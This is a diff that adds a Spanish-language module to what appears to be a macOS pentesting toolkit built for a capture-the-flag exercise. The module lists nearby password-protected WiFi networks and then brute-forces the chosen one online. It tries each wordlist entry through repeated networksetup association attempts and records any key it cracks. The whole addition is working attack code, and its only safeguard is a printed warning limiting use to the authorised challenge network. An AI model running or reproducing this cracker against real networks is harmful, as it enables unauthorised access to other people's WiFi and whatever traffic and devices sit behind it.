@@ -1409,3 +1409,103 @@ def m_brute(st):
 # ===========================================================================
 # MÓDULO 🔴 — Red 3: crackeo de WiFi por fuerza bruta ONLINE (estilo wifite)
 # ===========================================================================
+def m_wifi_crack(st):
+    print(f"{C.BOLD}[🔴] Crackear WiFi con clave — Red 3{C.END}")
+    print(f"  {C.R}⚠ SOLO contra la red AUTORIZADA del reto.{C.END}")
+    print(f"  {C.DIM}Prueba cada clave conectándose (online). En Mac no hay modo monitor,"
+          f"\n  así que no es captura de handshake: es intentar asociarse una y otra vez.{C.END}\n")
+    iface = st.iface
+    print(f"  {C.DIM}Escaneando redes...{C.END}")
+    nets = _parse_wifi(sh(["system_profiler", "SPAirPortDataType"], timeout=40))
+    secured = [x for x in nets if not x["open"]]
+    if not secured:
+        print(f"  {C.Y}No se hallaron redes con contraseña cerca.{C.END}"); return
+    secured.sort(key=lambda x: x["rssi"], reverse=True)
+    print(f"\n  {C.BOLD}Redes con contraseña:{C.END}")
+    for i, x in enumerate(secured, 1):
+        cur = f"  {C.G}← conectado{C.END}" if x["current"] else ""
+        print(f"   {C.CY}{i}{C.END}. {x['ssid'][:28]:<30} {x['rssi']}dBm  ch{x['channel']}  "
+              f"{x['security']}{cur}")
+    sel = input("\n  Nº de red a crackear: ").strip()
+    if not (sel.isdigit() and 1 <= int(sel) <= len(secured)):
+        print("  Cancelado."); return
+    ssid = secured[int(sel) - 1]["ssid"]
+
+    lists = sorted(f for f in os.listdir(WORDLIST_DIR)
+                   if os.path.isfile(os.path.join(WORDLIST_DIR, f))) if os.path.isdir(WORDLIST_DIR) else []
+    if not lists:
+        print(f"  {C.Y}No hay diccionarios.{C.END}"); return
+    print(f"\n  {C.BOLD}Diccionarios:{C.END}")
+    di = None
+    for i, f in enumerate(lists, 1):
+        if f.lower() == "starter.txt":
+            di = i
+        print(f"   {C.CY}{i}{C.END}. {f}  ({_wlsize(os.path.join(WORDLIST_DIR, f))})")
+    print(f"  {C.DIM}Cada intento tarda ~3-6s (hay que asociarse). rockyou (14M) es inviable "
+          f"online;\n  usa starter o una lista corta — en CTF la clave suele ser débil.{C.END}")
+    s = input(f"  Nº de diccionario{f' [{di}=starter]' if di else ''}: ").strip()
+    if not s and di:
+        s = str(di)
+    if not (s.isdigit() and 1 <= int(s) <= len(lists)):
+        print("  Cancelado."); return
+    wl = os.path.join(WORDLIST_DIR, lists[int(s) - 1])
+    try:
+        cap = int(input("  Máx. de intentos [150]: ").strip() or "150")
+    except ValueError:
+        cap = 150
+    no_digit = input("  ¿Descartar claves que empiezan con número? [S/n]: ").strip().lower() != "n"
+    try:
+        minlen = max(8, int(input("  Longitud mínima (WPA exige 8) [8]: ").strip() or "8"))
+    except ValueError:
+        minlen = 8
+
+    filt = f"{minlen}+ caracteres" + (", sin empezar por número" if no_digit else "")
+    print(f"\n  {C.Y}Esto desconectará tu WiFi en cada intento.{C.END} Ctrl-C para parar.")
+    print(f"  {C.DIM}Filtros WPA: {filt}. (se saltan las inviables sin gastar intento){C.END}")
+    print(f"  Atacando {C.G}{ssid}{C.END} con hasta {cap} claves válidas...\n")
+    found, n, skipped, t0 = None, 0, 0, time.time()
+    try:
+        with open(wl, encoding="latin-1") as fh:
+            for line in fh:
+                pw = line.rstrip("\n")
+                if not pw:
+                    continue
+                if len(pw) < minlen or len(pw) > 63 or (no_digit and pw[:1].isdigit()):
+                    skipped += 1
+                    continue
+                n += 1
+                if n > cap:
+                    break
+                out = sh(["networksetup", "-setairportnetwork", iface, ssid, pw], timeout=14)
+                ok = False
+                if not out.strip():
+                    time.sleep(1.2)
+                    ok = _ssid(iface) == ssid and bool(sh(["ipconfig", "getifaddr", iface]))
+                    if not ok:
+                        time.sleep(1.2)
+                        ok = _ssid(iface) == ssid and bool(sh(["ipconfig", "getifaddr", iface]))
+                rate = n / max(0.1, time.time() - t0)
+                mark = f"{C.G}✓{C.END}" if ok else f"{C.DIM}✗{C.END}"
+                print(f"   {mark} [{n}] {pw[:24]:<24} {C.DIM}({rate:.2f}/s){C.END}")
+                if ok:
+                    found = pw
+                    break
+    except KeyboardInterrupt:
+        print(f"\n  {C.DIM}Detenido.{C.END}")
+
+    if found:
+        print(f"\n  {C.G}{C.BOLD}✅ CLAVE ENCONTRADA{C.END}  {ssid} : {C.G}{found}{C.END}")
+        st.add("CRITICAL", "WiFi con contraseña débil (fuerza bruta)",
+               f"Clave de '{ssid}' hallada: {found}.",
+               "WPA2/WPA3 con passphrase larga y aleatoria; evitar claves de diccionario.")
+        st.captures.append({"kind": "cred", "value": f"WiFi {ssid} : {found}", "raw": found})
+    else:
+        print(f"\n  {C.Y}Sin éxito en {n} intentos.{C.END} "
+              f"{C.DIM}({skipped} inviables saltadas por los filtros){C.END}")
+        print(f"  {C.DIM}El brute online en Mac es lento; para una clave real usa el método "
+              f"offline (Kali + antena monitor + hashcat).{C.END}")
+
+
+# ===========================================================================
+# MÓDULO 🔵 — Red 1: conectar y pasar el captive portal automáticamente
+# ===========================================================================
